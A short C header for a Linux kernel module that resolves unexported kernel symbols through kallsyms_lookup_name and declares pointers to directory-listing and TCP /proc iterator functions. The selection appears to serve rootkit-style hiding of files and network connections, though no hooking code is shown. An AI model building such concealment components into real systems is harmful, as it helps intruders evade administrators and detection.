/*
  Access to symbols unexported by the linux kernel for dynamic linking
  with modules.
*/

#pragma once

#include <linux/types.h>
#include <linux/fs.h>

/// @brief Use `kallsyms_lookup_name` to resolve all required unexported symbols
/// @param kallsyms_lookup_name_addr address of the kallsyms_lookup_name_addr unexported symbol
void resolve_ksyms(void *kallsyms_lookup_name_addr);

extern unsigned long (*ksyms__kallsyms_lookup_name)(const char *name);

extern int (*ksyms__filldir64)(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type);
extern int (*ksyms__verify_dirent_name)(const char *name, int len);

extern void *(*ksyms__listening_get_next)(struct seq_file *seq, void *cur);
extern void *(*ksyms__tcp_get_idx)(struct seq_file *seq, loff_t pos);
extern void *(*ksyms__established_get_first)(struct seq_file *seq);
extern void *(*ksyms__established_get_next)(struct seq_file *seq, void *cur);
